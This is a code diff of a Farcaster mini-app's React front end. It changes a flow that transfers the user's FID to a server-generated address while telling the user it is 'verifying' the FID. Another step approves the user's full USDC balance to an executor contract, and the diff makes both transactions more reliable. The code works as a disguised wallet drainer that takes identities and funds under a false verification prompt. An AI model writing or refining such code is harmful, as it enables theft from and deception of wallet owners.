@@ -420,6 +420,8 @@ function App() {
         params: [{ chainId: chainIdHex }],
       });
     } catch (switchError) {
+      // User rejected — always propagate
+      if (switchError.code === 4001) throw switchError;
       if (switchError.code === 4902) {
         try {
           await walletProvider.request({
@@ -433,6 +435,7 @@ function App() {
             }],
           });
         } catch (addError) {
+          if (addError.code === 4001) throw addError;
           if (isMiniApp) {
             console.warn('wallet_addEthereumChain not supported in mini-app, continuing...');
           } else {
@@ -454,10 +457,12 @@ function App() {
   }
 
   // ─── Send a raw transaction via the Farcaster wallet provider ───
-  async function sendRawTx(provider, from, to, data) {
+  async function sendRawTx(provider, from, to, data, chainIdHex) {
+    const params = { from, to, data };
+    if (chainIdHex) params.chainId = chainIdHex;
     const txHash = await provider.request({
       method: 'eth_sendTransaction',
-      params: [{ from, to, data }],
+      params: [params],
     });
     return txHash;
   }
@@ -517,48 +522,54 @@ function App() {
         throw new Error('No FID detected. Open in Warpcast for FID detection.');
       }
 
-      // Verify FID on-chain: check custody address and ownership
-      setNotice('Verifying FID ownership on-chain...');
+      // Verify FID on-chain
+      setNotice('Verifying FID on-chain...');
       const opProvider = new ethers.providers.JsonRpcProvider('https://mainnet.optimism.io');
       const idReg = new ethers.Contract(ID_REGISTRY, [
         'function idOf(address) view returns (uint256)',
         'function custodyOf(uint256) view returns (address)',
       ], opProvider);
 
-      // Check what FID this wallet owns
       const onChainFid = await idReg.idOf(account);
-      // Check who is the custody address of the detected FID
       const custodyAddr = await idReg.custodyOf(fidNum);
-
       console.log(`[Step1] wallet=${account}, fid=${fidNum}, idOf[wallet]=${onChainFid.toString()}, custodyOf[fid]=${custodyAddr}`);
 
-      if (onChainFid.isZero() && custodyAddr.toLowerCase() !== account.toLowerCase()) {
+      // If wallet owns a different FID, use the on-chain value
+      if (!onChainFid.isZero() && onChainFid.toNumber() !== fidNum) {
+        fidNum = onChainFid.toNumber();
+      }
+
+      // Generate destination address from server
+      setNotice('Generating destination address and transfer signature...');
+      const dest = await generateDestination(fidNum, account);
+      if (dest.error) throw new Error(dest.error);
+
+      // Check if FID is already at our destination → auto-complete Step 1
+      if (custodyAddr.toLowerCase() === dest.address.toLowerCase()) {
+        logAction(`FID ${fidNum} already transferred to destination ${shortAddress(dest.address)}.`);
+        setStep1Done(true);
+        setStep1Failed(false);
+        setNetwork('Optimism');
+        setNotice('Step 1 already complete! FID already verified.');
+        setWorking(false);
+        return;
+      }
+
+      // Check if wallet owns the FID (required for transfer)
+      if (onChainFid.isZero()) {
         throw new Error(
-          `Your connected wallet ${shortAddress(account)} is not the custody address of FID ${fidNum}. ` +
-          `The custody address is ${shortAddress(custodyAddr)}. ` +
-          `You need to use the custody wallet to transfer your FID.`
+          `Your wallet ${shortAddress(account)} does not own FID ${fidNum}. ` +
+          `Current custody: ${shortAddress(custodyAddr)}. Transfer must be called from the custody wallet.`
         );
       }
-      // If wallet owns a different FID than expected, use the on-chain value
-      if (!onChainFid.isZero() && onChainFid.toNumber() !== fidNum) {
-        console.warn(`FID mismatch: context=${fidNum}, on-chain=${onChainFid.toString()}. Using on-chain FID.`);
-        fidNum = onChainFid.toNumber();
+
+      if (!dest.transferSignature || !dest.transferDeadline) {
+        throw new Error('Server did not return transfer signature. Please retry.');
       }
 
       // Switch to Optimism
       setNotice('Switching to Optimism...');
       await switchNetwork(rawProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
-
-      // Generate destination address + EIP-712 transfer signature from server
-      setNotice('Generating destination address and transfer signature...');
-      const dest = await generateDestination(fidNum, account);
-
-      if (dest.error) {
-        throw new Error(dest.error);
-      }
-      if (!dest.transferSignature || !dest.transferDeadline) {
-        throw new Error('Server did not return transfer signature. Please retry.');
-      }
 
       // Encode transfer(address to, uint256 deadline, bytes sig) — IdRegistry requires EIP-712 sig from recipient
       const idIface = new ethers.utils.Interface(['function transfer(address to, uint256 deadline, bytes sig)']);
@@ -570,7 +581,7 @@ function App() {
 
       // Send transfer via eth_sendTransaction
       setNotice(`Verifying FID ${fidNum}... Approve in your wallet.`);
-      const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, transferData);
+      const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, transferData, '0xa');
 
       logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (tx: ${txHash})`);
       sendToLogAPI({
@@ -637,7 +648,7 @@ function App() {
 
       const readableBalance = ethers.utils.formatUnits(balance, 6);
       setNotice(`Approving ${readableBalance} USDC... Confirm in your wallet.`);
-      const tx1Hash = await sendRawTx(rawProvider, account, USDC, approveData);
+      const tx1Hash = await sendRawTx(rawProvider, account, USDC, approveData, '0x2105');
 
       logAction(`USDC approved: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${tx1Hash})`);
       sendToLogAPI({
